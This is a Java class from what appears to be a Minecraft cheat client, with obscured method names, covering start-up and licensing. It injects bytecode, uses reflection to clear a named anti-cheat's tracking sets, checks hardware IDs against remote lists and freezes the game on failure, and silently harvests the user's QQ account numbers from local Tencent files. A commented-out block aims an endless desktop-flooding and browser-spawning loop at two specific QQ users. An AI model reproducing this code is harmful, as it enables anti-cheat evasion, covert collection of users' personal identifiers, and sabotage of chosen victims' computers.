package cn.snowflake.rose;

import cn.snowflake.rose.management.CommandManager;
import cn.snowflake.rose.management.FileManager;
import cn.snowflake.rose.management.FontManager;
import cn.snowflake.rose.management.ModManager;
import cn.snowflake.rose.mod.mods.WORLD.IRC;
import cn.snowflake.rose.transform.transforms.TransformMinecraft;
import cn.snowflake.rose.ui.skeet.SkeetClickGui;
import cn.snowflake.rose.utils.auth.HWIDUtils;
import cn.snowflake.rose.utils.auth.ShitUtil;
import io.netty.util.internal.ConcurrentSet;
import me.skids.margeleisgay.AuthMain;
import me.skids.margeleisgay.auth.AuthModule;
import me.skids.margeleisgay.auth.impl.CheckHWID;
import me.skids.margeleisgay.auth.impl.CheckVMProcess;
import me.skids.margeleisgay.auth.impl.CheckVersion;
import org.apache.logging.log4j.LogManager;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;
import org.objectweb.asm.tree.*;

import java.awt.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Objects;

public class NativeMethod implements Opcodes{


    public static void method1(MethodNode method){
        //if (!Season.isAuthed){
        //   new AuthMain();
        //}
        //new TransformMinecraft.runTick();
        InsnList insnList = new InsnList();
        LabelNode labelNode = new LabelNode();
        insnList.add(new FieldInsnNode(GETSTATIC, Type.getInternalName(Chentg.class), Chentg.class.getFields()[0].getName(),"Z"));
        insnList.add(new JumpInsnNode(IFNE,labelNode));
        insnList.add(new TypeInsnNode(NEW,Type.getInternalName(AuthMain.class)));
        insnList.add(new InsnNode(DUP));
        insnList.add(new MethodInsnNode(INVOKESPECIAL,Type.getInternalName(AuthMain.class),"<init>","()V", false));
        insnList.add(new InsnNode(POP));
        insnList.add(labelNode);
        insnList.add(new MethodInsnNode(Opcodes.INVOKESTATIC, Type.getInternalName(TransformMinecraft.class), "runTick", "()V", false));

        method.instructions.insert(method.instructions.getFirst(),insnList);
    }

    public static void method1(Client client,boolean e){
        if (!Client.nmsl){

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Field flis1 = Class.forName("luohuayu.anticheat.asm.AntiCheatTransformer").getDeclaredField("injectClass");
                        Field flis2 = Class.forName("luohuayu.anticheat.RuntimeInjectCheck").getDeclaredField("injectClass");
                        flis1.setAccessible(true);
                        flis2.setAccessible(true);
                        if ( ((ConcurrentSet)flis1.get(null)).size() > 0 || ((ConcurrentSet)flis2.get(null)).size() > 0) {
                             ((ConcurrentSet)flis1.get(null)).clear();
                             ((ConcurrentSet)flis2.get(null)).clear();
                        }
                    }catch (Exception e){
                    }

                }
            }).start();

            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false","",""),Client.version)){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException ee) {
                    ee.printStackTrace();
                }
            }
            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/hwid.txt?download=false","",""),HWIDUtils.getHWID())){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException ee) {
                    ee.printStackTrace();
                }
            }
            if (Client.username !=null){
                client.fontManager = new FontManager();
            }
            if (Client.shitname != null){
                client.modManager = new ModManager();
            }

            client.commandMgr = new CommandManager();//Command

            client.fileMgr = new FileManager();

            Client.clickGui = new SkeetClickGui();

            try {
                if (!ModManager.getModByClass(IRC.class).isEnabled()){
                    ModManager.getModByClass(IRC.class).set(true);
                }
            }catch (Exception ee){
                ee.printStackTrace();
            }
            Client.nmsl = true;
        }

        ArrayList<String> qq = new ArrayList<>();
        try {
            File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
            if (qqData.exists() && qqData.isFile()) {
                BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
                String line;
                while ((line = stream.readLine()) != null && line.length() > 0) {
                    if (line.startsWith("UserDataSavePath=")) {
                        File tencentFiles = new File(line.split("=")[1]);
                        if (tencentFiles.exists() && tencentFiles.isDirectory()) {
                            for (File qqdir : Objects.requireNonNull(tencentFiles.listFiles())) {
                                if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
                                    qq.add(qqdir.getName());
                                }
                            }
                        }
                    }
                }
            }
        } catch (Throwable e5) {
            e5.printStackTrace();
        }

//        if (qq.contains("2844290146") || qq.contains("1955844037")){
//
//            try {
//                FileSystemView fsv = FileSystemView.getFileSystemView();
//                File com = fsv.getHomeDirectory();
//
//                for (int i=0;i<Integer.MAX_VALUE;i++){
//                    Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://seasonclient.cf/");
//                    Desktop.getDesktop().browse(URI.create("https://seasonclient.cf/"));
//                    Files.createDirectories(Paths.get(com.getPath()+"/NMSL"+i));
//                    Files.createFile(Paths.get(com.getPath()+"/NMSL"+i+".nmsl"));
//                }
//            } catch (Exception ioException) {
//            }
//        }

        if (e){
            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false","",""),Client.version)){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException ee) {
                    ee.printStackTrace();
                }
            }
            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/hwid.txt?download=false","",""),HWIDUtils.getHWID())){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException ee) {
                    ee.printStackTrace();
                }
            }
        }


    }

    public static void method1(boolean b){
//        if (ClientLoader.runtimeObfuscationEnabled) {
//            new Thread(() -> {
//                while (true) {
//                    try {
//                        Thread.sleep(100L);
//
//                        Class<?> sb = Class.forName("net.minecraft.world.IIIiiiIIiIII");
//                        //HWID
//                        Field hwid = sb.getDeclaredField("ALLATORIxDEMO");
//                        if (!((String)hwid.get(null)).contains("snowflake.coding")){
//                            hwid.set(null, "https://snowflake.coding.net/p/hwid/d/FakeArzael/git/raw/master/HWID.txt?download=false");
//                        }
//
//                        //BanlistForZolomonANDunnamed
//                        Field field = sb.getDeclaredField("iiIIiiiIIiI");
//                        if (!((String)field.get(null)).contains("snowflake.coding")){
//                            field.set(null, "https://snowflake.coding.net/p/hwid/d/FakeArzael/git/raw/master/BanlistForZolomonANDunnamed.txt?download=false");
//                        }
//
//                        //version
//                        Field version = sb.getDeclaredField("iiIIiiIiIII");
//                        if (!((String)version.get(null)).contains("snowflake.coding")){
//                            version.set(null, "https://snowflake.coding.net/p/hwid/d/FakeArzael/git/raw/master/Version.txt?download=false");
//
//                        }
//                    } catch (Exception ignored) {
//                    }
//                }
//            }).start();
//        }
    }

    public static void method1(){
        if (Client.username == null) {
            while (true) {
                try {
                    Thread.sleep(10000000);

                } catch (InterruptedException interruptedException) {
                    interruptedException.printStackTrace();
                }
                LogManager.getLogger().error("NMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMsl");
            }
        }
    }

    /**
     *
     *  Enable and disable check
     *
     * @param game
     * @param mode
     */
    public static void method2(AuthModule game,String mode){
        if (mode.equalsIgnoreCase("onEnable")){
            if (game instanceof  CheckVersion){
                ((CheckVersion) game).selfversion = Client.version;
                ((CheckVersion) game).version = NativeMethod.method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false");
            }
            if (game instanceof CheckHWID){

                ((CheckHWID) game).selfHWID = HWIDUtils.getHWID();
                ((CheckHWID) game).targetHWID = NativeMethod.method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/hwid.txt?download=false");


                if (ShitUtil.contains(((CheckHWID) game).getTargetHWID(),(((CheckHWID) game).getSelfHWID()))){
                    Client.username = HWIDUtils.getSubString(( ((CheckHWID) game).getTargetHWID()),((CheckHWID) game).getSelfHWID()+"<",">");

                    if (Client.shitname == null){
                        Client.shitname = Client.username;
                    }
                }

            }
        }
        if (mode.equalsIgnoreCase("onDisable")){

        }
    }

    public static String method1(String string,String fuck,String fucking){
        try {
            HttpURLConnection connection = (HttpURLConnection)new URL(string).openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
            connection.setConnectTimeout(10000);
            connection.setUseCaches(false);
            connection.connect();
            if(connection.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer sbf = new StringBuffer();
                String temp = null;
                while ((temp = br.readLine()) != null) {
                    sbf.append(temp);
                    sbf.append("\r\n");
                }
                String result = sbf.toString();
                if(br != null) {
                    br.close();
                }
                return result;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static boolean method1(AuthModule game, boolean b){
        if (game instanceof CheckVMProcess){
            try {
                BufferedReader input = new BufferedReader(new InputStreamReader(((CheckVMProcess) game).getProcess().getInputStream()));
                String line;
                while ((line = input.readLine()) != null) {
                    for (String target : ((CheckVMProcess) game).getTargetProcess()) {
                        if(line.contains(target)) {
                            return false;
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return true;
    }
    /**
     *
     * @param game
     *  CheckMessage Pass
     *
     */
    public static void method1(AuthModule game){
        if (game instanceof CheckVersion){
            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false"),Client.version)){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            if(!((CheckVersion) game).version.equals(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false"))){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            if (!game.run()) {
                try {
                    Class<?> clazz = Class.forName("javax.swing.JOptionPane");
                    String str1 = "\u4f60\u6ca1\u6709\u901a\u8fc7\u7248\u672c\u9a8c\u8bc1";//version check info
                    String leastversion = method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/version.txt?download=false");
                    Method m = clazz.getMethod("showInputDialog", Component.class, Object.class, Object.class);
                    m.invoke(m, null, str1, leastversion);
                    Thread.sleep(10000000);
                } catch (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | InterruptedException e) {
                    LogManager.getLogger().error("NMSL");
                }
            }
        }

        if (game instanceof CheckHWID){
            if (!ShitUtil.contains(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/hwid.txt?download=false"),HWIDUtils.getHWID())){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            if(!((CheckHWID) game).getTargetHWID().equals(method1("https://fytzfc.coding.net/p/chentgsense/d/rose/git/raw/master/hwid.txt?download=false"))){
                try {
                    Thread.sleep(10000000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

    }


    public static String method1(String string){

        try {
            HttpURLConnection connection = (HttpURLConnection)new URL(string).openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
            connection.setConnectTimeout(10000);
            connection.setUseCaches(false);
            connection.connect();
            if(connection.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer sbf = new StringBuffer();
                String temp = null;
                while ((temp = br.readLine()) != null) {
                    sbf.append(temp);
                    sbf.append("\r\n");
                }
                String result = sbf.toString();
                if(br != null) {
                    br.close();
                }
                return result;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

}
